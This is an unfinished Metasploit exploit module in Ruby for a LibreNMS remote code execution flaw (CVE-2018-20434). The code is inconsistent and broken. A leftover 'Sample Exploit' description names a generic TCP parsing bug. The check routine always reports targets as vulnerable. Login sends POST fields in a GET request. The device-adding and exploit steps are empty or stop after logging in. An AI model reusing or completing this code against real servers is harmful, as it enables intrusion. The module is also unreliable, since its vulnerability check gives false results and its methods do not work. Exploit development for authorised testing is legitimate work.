##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Exploit::Remote::HttpClient
  include Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Sample Exploit',
      'Description'    => %q(
          This exploit module illustrates how a vulnerability could be exploited
        in an TCP server that has a parsing bug.
      ),
      'License'        => MSF_LICENSE,
      'Author'         =>
      [
        'mhaskar',       # Vulnerability discovery and PoC
        'Shelby Pace'    # Metasploit module
      ],
      'References'     =>
        [
          [ 'CVE', '2018-20434' ],
          [ 'URL', 'https://shells.systems/librenms-v1-46-remote-code-execution-cve-2018-20434/' ],
          [ 'URL', 'https://gist.github.com/mhaskar/516df57aafd8c6e3a1d70765075d372d' ]
        ],
      'Payload'        =>
        {
          'Space'    => 1000
        },
      'Targets'        =>
        [
          [
            'linux',
            {
              'Platform' => 'linux'
            }
          ]
        ],
      'DisclosureDate' => "Dec 24 2018",
      'DefaultTarget'  => 0
    ))

    register_options(
    [
      OptString.new('TARGETURI', [ true, 'Base LibreNMS path', '/' ]),
      OptString.new('USERNAME', [ true, 'User name for LibreNMS', '' ]),
      OptString.new('PASSWORD', [ true, 'Password for LibreNMS', '' ])
    ])
  end

  def check
    Exploit::CheckCode::Vulnerable
  end

  def login
    res = send_request_cgi(
      'method'    =>  'GET',
      'uri'       =>  normalize_uri(target_uri.path, 'login'),
      'vars_post' =>
      {
        'username'  =>  datastore['USERNAME'],
        'password'  =>  datastore['PASSWORD'],
        'submit'    =>  ''
      }
    )

    fail_with(Failure::NotFound, 'Failed to log in') unless res && res.code == 200

  end

  def add_device
    add_uri = normalize_uri(target_uri.path, 'addhost')


  end

  def del_device

  end

  def exploit
    login
  end
end
